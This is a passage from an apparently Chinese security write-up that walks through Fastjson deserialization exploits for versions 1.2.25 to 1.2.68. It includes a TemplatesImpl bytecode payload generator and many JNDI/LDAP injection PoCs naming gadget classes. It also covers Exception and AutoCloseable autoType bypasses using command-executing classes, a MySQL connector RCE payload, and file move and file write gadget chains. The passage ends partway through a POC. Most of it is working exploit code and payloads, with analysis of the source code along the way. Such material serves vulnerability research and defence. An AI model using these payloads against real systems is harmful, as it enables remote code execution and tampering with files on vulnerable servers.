    public static void main( String[] args ) throws NotFoundException, CannotCompileException, IOException &#123;
        //构造恶意类
        ClassPool pool = ClassPool.getDefault();
        CtClass Evil = pool.makeClass(&quot;Evil&quot;);
        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));
        String name = &quot;Evil&quot;;
        Evil.setName(name);
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
        CtConstructor constructor = Evil.makeClassInitializer();
        constructor.insertBefore(cmd);
        byte[] bytes =Evil.toBytecode();

        byte[] encodedBytes = Base64.getEncoder().encode(bytes);
        String base64Code=new String(encodedBytes, StandardCharsets.UTF_8);
        String payload =&quot;&#123;\n&quot; +
                &quot;    \&quot;a\&quot;:&#123;\n&quot; +
                &quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot; +
                &quot;        \&quot;val\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;&#125;,\n&quot; +
                &quot;    \&quot;b\&quot;:&#123;\n&quot; +
                &quot;        \&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot; +
                &quot;        \&quot;_bytecodes\&quot;:[\&quot;&quot;+base64Code+&quot;\&quot;],\n&quot; +
                &quot;        \&quot;_name\&quot;:\&quot;aa\&quot;,\n&quot; +
                &quot;        \&quot;_tfactory\&quot;:&#123; &#125;,\n&quot; +
                &quot;        \&quot;_outputProperties\&quot;:&#123;&#125;,\n&quot; +
                &quot;        \&quot;_version\&quot;:\&quot;\&quot;\n&quot; +
                &quot;    &#125;\n&quot; +
                &quot;&#125;&quot;;

        JSON.parse(payload, Feature.SupportNonPublicField);

    &#125;
&#125;
</code></pre>
<p><strong>注意：</strong></p>
<ul>
<li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</li>
<li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</li>
</ul>
<h2 id="Fastjson1-2-25-1-2-59"><a href="#Fastjson1-2-25-1-2-59" class="headerlink" title="Fastjson1.2.25-1.2.59"></a>Fastjson1.2.25-1.2.59</h2><p>需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制</p>
<p>com.zaxxer.hikari.HikariConfig类PoC：</p>
<pre><code class="json">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;
或
&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;
</code></pre>
<h2 id="Fastjson1-2-25-1-2-61"><a href="#Fastjson1-2-25-1-2-61" class="headerlink" title="Fastjson1.2.25-1.2.61"></a>Fastjson1.2.25-1.2.61</h2><p>需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制</p>
<p>org.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC：</p>
<pre><code class="json">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;Object&quot;:&quot;a&quot;&#125;
</code></pre>
<h2 id="Fastjson1-2-25-1-2-62"><a href="#Fastjson1-2-25-1-2-62" class="headerlink" title="Fastjson1.2.25-1.2.62"></a>Fastjson1.2.25-1.2.62</h2><p>条件：xbean-reflect，开启AutoType</p>
<p>环境搭建：</p>
<pre><code class="xml">&lt;dependency&gt;
  &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
  &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
  &lt;version&gt;1.2.62&lt;/version&gt;
&lt;/dependency&gt;

&lt;dependency&gt;
      &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;
      &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;
      &lt;version&gt;4.15&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>1.2.48中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将java.lang.Class类加入到了黑名单中。</p>
<p>这个版本是找到一个新的利用类进行黑名单绕过</p>
<p>使用的是org.apache.xbean.propertyeditor.JndiConverter这个类</p>
<p>漏洞在</p>
<pre><code class="java">public class JndiConverter extends AbstractConverter &#123;
    public JndiConverter() &#123;
        super(Context.class);
    &#125;

    protected Object toObjectImpl(String text) &#123;
        try &#123;
            InitialContext context = new InitialContext();
            return (Context) context.lookup(text);
        &#125; catch (NamingException e) &#123;
            throw new PropertyEditorException(e);
        &#125;
    &#125;

&#125;
</code></pre>
<p>这个类继承<code>AbstractConverter</code>，而且可以看到这个<code>toObjectImpl</code>方法，如果参数text可控，则可以进行JNDI注入</p>
<p>查找哪里调用了<code>toObjectImpl</code>方法</p>
<pre><code class="java">public final Object toObject(String text) &#123;
    if (text == null) &#123;
        return null;
    &#125;
    Object value = toObjectImpl((trim) ? text.trim() : text);
    return value;
&#125;
</code></pre>
<p>再寻找调用<code>toObject</code>的地方</p>
<pre><code class="java">public final void setAsText(String text) &#123;
    Object value = toObject((trim) ? text.trim() : text);
    super.setValue(value);
&#125;
</code></pre>
<p>这个setter方法满足fastjson反序列化自动调用</p>
<p>因为AbstractConverter是abstract修饰的类</p>
<pre><code class="java">public abstract class AbstractConverter extends PropertyEditorSupport implements Converter&#123;&#125;
</code></pre>
<p>所以这里@type使用的是继承AbstractConverter的类<code>org.apache.xbean.propertyeditor.JndiConverter</code></p>
<p>最终POC</p>
<pre><code class="java">package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.xbean.propertyeditor.JndiConverter;
public class App
&#123;
    public static void main( String[] args ) &#123;
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;&#125;&quot;;
        JSON.parseObject(payload);

    &#125;
&#125;
</code></pre>
<p>还可以使用另外的类：</p>
<p>org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：</p>
<pre><code class="json">&#123;&quot;@type&quot;:&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123;&quot;@type&quot;:&quot;java.util.Hashtable&quot;,&quot;java.naming.factory.initial&quot;:&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,&quot;topic-factory&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;, &quot;namespace&quot;:&quot;&quot;&#125;
</code></pre>
<h2 id="Fastjson1-2-25-1-2-66"><a href="#Fastjson1-2-25-1-2-66" class="headerlink" title="Fastjson1.2.25-1.2.66"></a>Fastjson1.2.25-1.2.66</h2><p>条件：开启AutoType</p>
<p>这里也是寻找到新的利用类，这个版本有很多,原理都一样就不一个个分析了</p>
<p>org.apache.shiro.realm.jndi.JndiRealmFactory类PoC：</p>
<pre><code class="json">&#123;&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:[&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;], &quot;Realms&quot;:[&quot;&quot;]&#125;
</code></pre>
<p>br.com.anteros.dbcp.AnterosDBCPConfig类PoC：</p>
<pre><code class="json">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;&#125;
或
&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;&#125;
</code></pre>
<p>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类PoC：</p>
<pre><code class="json">&#123;
    &quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,
    &quot;properties&quot;: &#123;
        &quot;@type&quot;:&quot;java.util.Properties&quot;,
        &quot;UserTransaction&quot;:&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;
    &#125;
&#125;
</code></pre>
<p>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；</p>
<p>br.com.anteros.dbcp.AnterosDBCPConfig类需要Anteros-Core和Anteros-DBCP包；</p>
<p>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</p>
<h2 id="Fastjson1-2-25-1-2-67"><a href="#Fastjson1-2-25-1-2-67" class="headerlink" title="Fastjson1.2.25-1.2.67"></a>Fastjson1.2.25-1.2.67</h2><p>条件：开启AutoType</p>
<p>也是找到新的利用类</p>
<p>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC：</p>
<pre><code class="json">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;:[&quot;ldap://localhost:1389/Exploit&quot;], &quot;tm&quot;: &#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;&#125;
</code></pre>
<p>org.apache.shiro.jndi.JndiObjectFactory类PoC：</p>
<pre><code class="json">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;&#125;
</code></pre>
<p>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；</p>
<p>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；</p>
<h2 id="Fastjson1-2-25-1-2-68"><a href="#Fastjson1-2-25-1-2-68" class="headerlink" title="Fastjson1.2.25-1.2.68"></a>Fastjson1.2.25-1.2.68</h2><p>环境搭建：</p>
<pre><code class="xml">&lt;dependency&gt;
  &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
  &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
  &lt;version&gt;1.2.68&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>上面几个版本的修复都是通过将可利用的恶意类添加到黑名单</p>
<p>下面是全新的绕过方式</p>
<h3 id="Exception绕过（-gt-1-2-39）"><a href="#Exception绕过（-gt-1-2-39）" class="headerlink" title="Exception绕过（&gt;1.2.39）"></a>Exception绕过（&gt;1.2.39）</h3><p>这个绕过有点类似1.2.47版本的  这里使用的是<code>java.lang.Exception</code>的这个类，利用条件有点苛刻</p>
<pre><code class="json">&#123;&quot;@type&quot;:&quot;java.lang.Exception&quot;&#125;
</code></pre>
<p>为什么要使用这个，首先，这个类不在黑白名单里面，其次这个类是反序列化的过程中程序已经存储在mappings缓存里面了，clazz可直接在这里获取到类名返回</p>
<p>即<code>checkAutoType()</code>里面的：</p>
<pre><code class="java">clazz = TypeUtils.getClassFromMapping(typeName);
</code></pre>
<pre><code class="java">public static Class&lt;?&gt; getClassFromMapping(String className)&#123;
    return mappings.get(className);
&#125;
</code></pre>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230811155546108.png" alt="image-20230811155546108"></p>
<p>获取到这个clazz之后，返回到<code>DefaultJSONParser.parseObject</code></p>
<p>运行到结尾处</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230811160312151.png" alt="image-20230811160312151"></p>
<p>进入这个<code>deserialze</code></p>
<p>这里存在一个逻辑，根据一些条件来设置<code>exClass</code>变量的值</p>
<pre><code class="java">if (type != null &amp;&amp; type instanceof Class) &#123;
    Class&lt;?&gt; clazz = (Class&lt;?&gt;) type;
    if (Throwable.class.isAssignableFrom(clazz)) &#123;
       exClass = clazz;
    &#125;
&#125;
</code></pre>
<p>首先判断这个type是不是Class的实例，再判断是不是<code>Throwable</code>或其子类，如果满足这些条件就给<code>exClass = clazz</code>,  java.lang.Exception就满足了这些情况</p>
<p>往下</p>
<p>下面的逻辑是解析json中的下一个key和value ，有点类似DefaultJSONParser.parseObject中第一次运行到checkAutoType的逻辑</p>
<pre><code class="java">String key = lexer.scanSymbol(parser.getSymbolTable());
lexer.nextTokenWithColon(JSONToken.LITERAL_STRING);

if (JSON.DEFAULT_TYPE_KEY.equals(key)) &#123;
    if (lexer.token() == JSONToken.LITERAL_STRING) &#123;
        String exClassName = lexer.stringVal();
        exClass = parser.getConfig().checkAutoType(exClassName, Throwable.class, lexer.getFeatures());
    &#125; else &#123;
        throw new JSONException(&quot;syntax error&quot;);
    &#125;
    lexer.nextToken(JSONToken.COMMA);
&#125; 
</code></pre>
<p>首先获取key，判断这个key是不是@type 如果是，则再获取处Value,也就是@type指定的类的名字，然后再进入<code>checkAutoType</code>进行检查</p>
<p>注意的是，这次checkAutoType的第二个参数是<code>Throwable.class</code>,而第一次为NULL</p>
<p>跟进checkAutoType</p>
<p>来到这个地方</p>
<pre><code class="java">final boolean expectClassFlag;
if (expectClass == null) &#123;
    expectClassFlag = false;
&#125; else &#123;
    if (expectClass == Object.class
            || expectClass == Serializable.class
            || expectClass == Cloneable.class
            || expectClass == Closeable.class
            || expectClass == EventListener.class
            || expectClass == Iterable.class
            || expectClass == Collection.class
            ) &#123;
        expectClassFlag = false;
    &#125; else &#123;
        expectClassFlag = true;
    &#125;
&#125;
</code></pre>
<p>这里定义了一个布尔类型的expectClassFlag，再判断expectClass是否为空，expectClass就是checkAutoType的第二个参数  <code>class java.lang.Throwable</code>,不为空，然后在判断expectClass是不上那几个类，如果是则expectClassFlag &#x3D; false ，显然，Throwable.class并不在其中 ，所以expectClassFlag &#x3D; true</p>
<p>expectClassFlag &#x3D; true有什么用呢？</p>
<p>继续往下，经过了黑白名单检查后，来到了这个逻辑</p>
<pre><code class="java">if (autoTypeSupport || jsonType || expectClassFlag) &#123;
    boolean cacheClass = autoTypeSupport || jsonType;
    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);
&#125;
</code></pre>
<p>这里expectClassFlag&#x3D;true,会进入这个if语句，然后就加载得到clazz</p>
<p>加载后在哪返回?</p>
<pre><code class="java">if (expectClass != null) &#123;
                if (expectClass.isAssignableFrom(clazz)) &#123;
                    TypeUtils.addMapping(typeName, clazz);
                    return clazz;
                &#125; else &#123;
                    throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
                &#125;
            &#125;
</code></pre>
<p>因为expectClass !&#x3D; null进入这个判断里，再判断第二个@type指定的类，即clazz，是不是<code>java.lang.Throwable</code>的子类或者相同类</p>
<p>如果是则添加到Mapping里面并返回</p>
<p>也就是说，要利用这个绕过方法，autoType可开可不开,但利用的恶意类必须是<code>Throwable</code>的子类或者相同类 ，而且还不能是存在于黑名单的类</p>
<p>例如自己写的恶意类</p>
<pre><code class="java">import java.io.IOException;
import java.lang.Exception;
import java.lang.Throwable;
public class Test extends Throwable&#123;
//public class Test extends Exception&#123;  //也可以继承 Exception
    private String domain;
    public Test() &#123;
        super();
    &#125;
    public void setDomain(String domain) &#123;
        this.domain = domain;
    &#125;
    @Override
    public String getMessage() &#123;
        try &#123;
            Runtime.getRuntime().exec(new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;,domain&#125;);
        &#125; catch (IOException e) &#123;
            return e.getMessage();
        &#125;

        return super.getMessage();
    &#125;
&#125;
</code></pre>
<p>然后POC如下:</p>
<pre><code class="java">package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class App
&#123;
    public static void main( String[] args ) &#123;
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload=&quot; &#123;\n&quot; +
                &quot;            \&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\n&quot; +
                &quot;                \&quot;@type\&quot;: \&quot;org.example.Test\&quot;,\n&quot; +
                &quot;                \&quot;domain\&quot;: \&quot;calc\&quot;\n&quot; +
                &quot;        &#125;&quot;;
        JSON.parseObject(payload);

    &#125;
&#125;
</code></pre>
<p>网上找了一圈，找到符合要求的利用类是<code>org.openqa.selenium.WebDriverException</code></p>
<pre><code class="java">public class WebDriverException extends RuntimeException
</code></pre>
<p>这个RuntimeException是Exception的子类，满足条件</p>
<p>利用的是下面这个方法来获取到一些信息</p>
<pre><code class="java">public String getSystemInformation() &#123;
    String host = &quot;N/A&quot;;
    String ip = &quot;N/A&quot;;

    try &#123;
        host = InetAddress.getLocalHost().getHostName();
        ip = InetAddress.getLocalHost().getHostAddress();
    &#125; catch (UnknownHostException var4) &#123;
    &#125;

    return String.format(&quot;System info: host: &#39;%s&#39;, ip: &#39;%s&#39;, os.name: &#39;%s&#39;, os.arch: &#39;%s&#39;, os.version: &#39;%s&#39;, java.version: &#39;%s&#39;&quot;, host, ip, System.getProperty(&quot;os.name&quot;), System.getProperty(&quot;os.arch&quot;), System.getProperty(&quot;os.version&quot;), System.getProperty(&quot;java.version&quot;));
&#125;
</code></pre>
<p>但是这个方法的返回值是 <code>String</code>类型的，不符合自动调用getter </p>
<p>这里使用<code>$ref</code>的方式来调用任意的getter</p>
<pre><code class="java">String payload = &quot;&#123;\&quot;x\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\&quot;@type\&quot;:\&quot;org.openqa.selenium.WebDriverException\&quot;&#125;,\&quot;content\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$x.systemInformation\&quot;&#125;&#125;&quot;;
JSONObject j = JSON.parseObject(payload);
System.out.println(j.getString(&quot;content&quot;));
</code></pre>
<h3 id="AutoCloseable绕过"><a href="#AutoCloseable绕过" class="headerlink" title="AutoCloseable绕过"></a>AutoCloseable绕过</h3><p>除了Exception之外，还可以用通过AutoCloseable的方式来进行绕过</p>
<pre><code class="java">clazz = TypeUtils.getClassFromMapping(typeName);
</code></pre>
<p>这个<code>java.lang.AutoCloseable</code>接口存在于mapping的缓存中</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230814104302725.png" alt="image-20230814104302725"></p>
<p>后面的流程是和上面Exception的绕过方法流程是一样的</p>
<p>只要找到一个类实现了<code>AutoCloseable</code>接口的类，并且这个类不存在于黑名单中就可以利用了</p>
<p>例如</p>
<pre><code class="java">package org.example;
import java.io.IOException;
import java.lang.Exception;

public class Test implements AutoCloseable&#123;
    private String domain;
    public Test() &#123;
        super();
    &#125;
    public void setDomain(String domain) &#123;
        this.domain = domain;
    &#125;

    public Class&lt;?&gt; getMessage() &#123;
        try &#123;
            Runtime.getRuntime().exec(new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;,domain&#125;);
        &#125; catch (IOException e) &#123;
            return e.getMessage().getClass();
        &#125;

        return super.getClass();
    &#125;

    @Override
    public void close() throws Exception &#123;

    &#125;
&#125;
</code></pre>
<p>poc:</p>
<pre><code class="java">String payload=&quot; &#123;\n&quot; +
        &quot;            \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot; +
        &quot;                \&quot;@type\&quot;: \&quot;org.example.Test\&quot;,\n&quot; +
        &quot;                \&quot;domain\&quot;: \&quot;calc\&quot;\n&quot; +
        &quot;        &#125;&quot;;

JSON.parseObject(payload);
</code></pre>
<h3 id="Mysql-RCE"><a href="#Mysql-RCE" class="headerlink" title="Mysql RCE"></a>Mysql RCE</h3><p>环境搭建</p>
<pre><code class="xml">&lt;dependency&gt;
    &lt;groupId&gt;mysql&lt;/groupId&gt;
    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;
    &lt;version&gt;5.1.11&lt;/version&gt;
&lt;/dependency&gt;

//MYSQL RCE需要配合Gadget使用
&lt;dependency&gt;
    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
    &lt;version&gt;3.1&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>这个是依赖上面的AutoCloseable进行绕过，利用的类是<code>com.mysql.jdbc.JDBC4Connection</code></p>
<p>JDBC4Connection继承ConnectionImpl，ConnectionImpl实现Connection的接口，Connection继承java.sql.Connection，java.sql.Connection继承AutoCloseable, 而且这个类不在 黑名单里面看，所以这个类是可以使用的</p>
<p>POC如下：</p>
<p>需要使用<a target="_blank" rel="noopener" href="https://github.com/4ra1n/mysql-fake-server%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%E8%B5%B7%E4%B8%80%E4%B8%AA%E8%99%9A%E5%81%87%E7%9A%84mysql%E6%9C%8D%E5%8A%A1">https://github.com/4ra1n/mysql-fake-server这个工具起一个虚假的mysql服务</a></p>
<pre><code class="json">&#123; 
    &quot;name&quot;: &#123; 
        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, 
        &quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;, 
        &quot;hostToConnectTo&quot;: &quot;127.0.0.1&quot;, 
        &quot;portToConnectTo&quot;: 3308, 
        &quot;info&quot;: &#123; 
            &quot;user&quot;: &quot;deser_CC31_calc.exe&quot;, 
            &quot;password&quot;: &quot;pass&quot;, 
            &quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;, 
            &quot;autoDeserialize&quot;: &quot;true&quot;, 
            &quot;NUM_HOSTS&quot;: &quot;1&quot; 
        &#125; 
    &#125;
</code></pre>
<p>上面的POC只是适合mysql-connector 5.1.x版本的</p>
<p>不同的mysql-connector版本poc不同</p>
<p><img src="https://img.sumsec.me///52u3652ec52u3652ec.png" alt="image-20211220173824621"></p>
<h3 id="SafeFileOutputStream文件操作"><a href="#SafeFileOutputStream文件操作" class="headerlink" title="SafeFileOutputStream文件操作"></a>SafeFileOutputStream文件操作</h3><p>环境搭建</p>
<pre><code class="xml">&lt;dependency&gt;
    &lt;groupId&gt;org.aspectj&lt;/groupId&gt;
    &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;
    &lt;version&gt;1.5.4&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>这里使用的是<code>org.eclipse.core.internal.localstore.SafeFileOutputStream</code></p>
<p>SafeFileOutputStream继承OutputStream，OutputStream实现Closeable接口，Closeable接口继承AutoCloseable,所以这个类可以用</p>
<p>主要利用的是这个构造函数</p>
<pre><code class="java">public SafeFileOutputStream(String targetPath, String tempPath) throws IOException &#123;
        this.failed = false;
        this.target = new File(targetPath);
        this.createTempFile(tempPath);
        if (!this.target.exists()) &#123;
            if (!this.temp.exists()) &#123;
                this.output = new BufferedOutputStream(new FileOutputStream(this.target));
                return;
            &#125;

            this.copy(this.temp, this.target);
        &#125;

        this.output = new BufferedOutputStream(new FileOutputStream(this.temp));
    &#125;
</code></pre>
<p>首先调用了createTempFile，如果tempPath为空则会指定为默认的<code>this.target.getAbsolutePath() + &quot;.bak&quot;;</code><br>如果不为空则以tempPath为主。</p>
<pre><code class="java">protected void createTempFile(String tempPath) &#123;
    if (tempPath == null) &#123;
        tempPath = this.target.getAbsolutePath() + &quot;.bak&quot;;
    &#125;

    this.temp = new File(tempPath);
&#125;
</code></pre>
<p>接着判断target是否存在，以及temp是否存在。如果target不存在，temp存在，则会调用copy方法,copy方法会将temp的内容丢给target</p>
<pre><code class="java">protected void copy(File sourceFile, File destinationFile) throws IOException &#123;
    if (sourceFile.exists()) &#123;
        if (!sourceFile.renameTo(destinationFile)) &#123;
            InputStream source = new BufferedInputStream(new FileInputStream(sourceFile));
            OutputStream destination = new BufferedOutputStream(new FileOutputStream(destinationFile));
            this.transferStreams(source, destination);
        &#125;
    &#125;
&#125;
</code></pre>
<p>这个其实就是一个文件迁移的操作</p>
<p>POC如下</p>
<pre><code class="json">&#123; 
    &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, 
    &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;, 
    &quot;targetPath&quot;: &quot;./1.txt&quot;, 
    &quot;tempPath&quot;: &quot;./2.txt&quot;
&#125;
//将2.txt的内容迁移到1.txt中，2.txt中的内容被清空
</code></pre>
<h3 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h3><p>环境搭建</p>
<pre><code class="xml">&lt;dependency&gt;
    &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;
    &lt;artifactId&gt;kryo&lt;/artifactId&gt;
    &lt;version&gt;4.0.0&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;
    &lt;artifactId&gt;je&lt;/artifactId&gt;
    &lt;version&gt;18.3.12&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>接着上面的文件操作</p>
<p>这里利用的连个类<code>com.esotericsoftware.kryo.io.Output</code>和<code>com.sleepycat.bind.serial.SerialOutput</code>都是<code>AutoCloseable</code></p>
<p>的子类，可利用</p>
<p>在SafeFileOutputStream中，创建了一个以tempPath或者targetPath为目标的输出流</p>
<p>如果tempPath不存在，则BufferedOutputStream就是targetPath，如果tempPath存在targetPath不存在，则BufferedOutputStream就是tempPath。</p>
<pre><code class="java">public SafeFileOutputStream(String targetPath, String tempPath) throws IOException &#123;
    this.failed = false;
    this.target = new File(targetPath);
    this.createTempFile(tempPath);
    if (!this.target.exists()) &#123;
        if (!this.temp.exists()) &#123;
            this.output = new BufferedOutputStream(new FileOutputStream(this.target));
            return;
        &#125;

        this.copy(this.temp, this.target);
    &#125;

    this.output = new BufferedOutputStream(new FileOutputStream(this.temp));
&#125;
</code></pre>
<p>如果能控制这个输出流就能进行文件写入了，如何控制这个输出流？</p>
<p>在<code>com.esotericsoftware.kryo.io.Output</code>这个类中找到一个set写入输出流</p>
<pre><code class="java">public void setOutputStream(OutputStream outputStream) &#123;
    this.outputStream = outputStream;
    this.position = 0;
    this.total = 0L;
&#125;
</code></pre>
<p>可以通过fastjson的循环引用<code>$ref</code>,获取到<code>SafeFileOutputStream</code>的输出流</p>
<p>在flush中将内容写入</p>
<pre><code class="java">public void flush() throws KryoException &#123;
    if (this.outputStream != null) &#123;
        try &#123;
            this.outputStream.write(this.buffer, 0, this.position);
            this.outputStream.flush();
        &#125; catch (IOException var2) &#123;
            throw new KryoException(var2);
        &#125;

        this.total += (long)this.position;
        this.position = 0;
    &#125;
&#125;
</code></pre>
<p>可以看到这个flush代码中的<code>write</code>调用，将存储在缓冲区<code>buffer</code>中的内容，从位置0开始，长度this.position的内容，通过输出流输出</p>
<p>this.buffer可以控制</p>
<pre><code class="java">public void setBuffer(byte[] buffer) &#123;
    this.setBuffer(buffer, buffer.length);
&#125;

public void setBuffer(byte[] buffer, int maxBufferSize) &#123;
    if (buffer == null) &#123;
        throw new IllegalArgumentException(&quot;buffer cannot be null.&quot;);
    &#125; else if (buffer.length &gt; maxBufferSize &amp;&amp; maxBufferSize != -1) &#123;
        throw new IllegalArgumentException(&quot;buffer has length: &quot; + buffer.length + &quot; cannot be greater than maxBufferSize: &quot; + maxBufferSize);
    &#125; else if (maxBufferSize &lt; -1) &#123;
        throw new IllegalArgumentException(&quot;maxBufferSize cannot be &lt; -1: &quot; + maxBufferSize);
    &#125; else &#123;
        this.buffer = buffer;
        this.maxCapacity = maxBufferSize == -1 ? Integer.MAX_VALUE : maxBufferSize;
        this.capacity = buffer.length;
        this.position = 0;
        this.total = 0L;
        this.outputStream = null;
    &#125;
&#125;
</code></pre>
<p>注意：写入的内容会转为byte类型数组，在fastjson中，这个byte数组会被base64解码，所以要将写入的内容进行base64加密</p>
<p>this.position也可以控制</p>
<pre><code class="java">public void setPosition(int position) &#123;
    this.position = position;
&#125;
</code></pre>
<p>到此，就差如何调用flush()触发漏洞</p>
<p>flush 方法只有在 close 和 write 方法被调用时才会触发。</p>
<p>com.sleepycat.bind.serial.SerialOutput这个类继承着ObjectOutputStream</p>
<p>在ObjectOutputStream中存在一个构造方法：</p>
<pre><code class="java">public ObjectOutputStream(OutputStream out) throws IOException &#123;
    verifySubclass();
    bout = new BlockDataOutputStream(out);
    handles = new HandleTable(10, (float) 3.00);
    subs = new ReplaceTable(10, (float) 3.00);
    enableOverride = false;
    writeStreamHeader();
    bout.setBlockDataMode(true);
    if (extendedDebugInfo) &#123;
        debugInfoStack = new DebugTraceInfoStack();
    &#125; else &#123;
        debugInfoStack = null;
    &#125;
&#125;
</code></pre>
<p>跟进 setBlockDataMode()</p>
<pre><code class="java">boolean setBlockDataMode(boolean mode) throws IOException &#123;
    if (blkmode == mode) &#123;
        return blkmode;
    &#125;
    drain();
    blkmode = mode;
    return !blkmode;
&#125;
</code></pre>
<p>跟进drain()</p>
<pre><code class="java">void drain() throws IOException &#123;
    if (pos == 0) &#123;
        return;
    &#125;
    if (blkmode) &#123;
        writeBlockHeader(pos);
    &#125;
    out.write(buf, 0, pos);
    pos = 0;
&#125;
</code></pre>
<p>这里就调用了<code>write</code></p>
<p>将out设置为<code>com.esotericsoftware.kryo.io.Output</code>这个类即可</p>
<p>最终POC:</p>
<pre><code class="json">&#123;
    &quot;stream&quot;: &#123;
        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,
        &quot;targetPath&quot;: &quot;/1.txt&quot;,
        &quot;tempPath&quot;: &quot;a&quot;
    &#125;,
    &quot;writer&quot;: &#123;
        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,
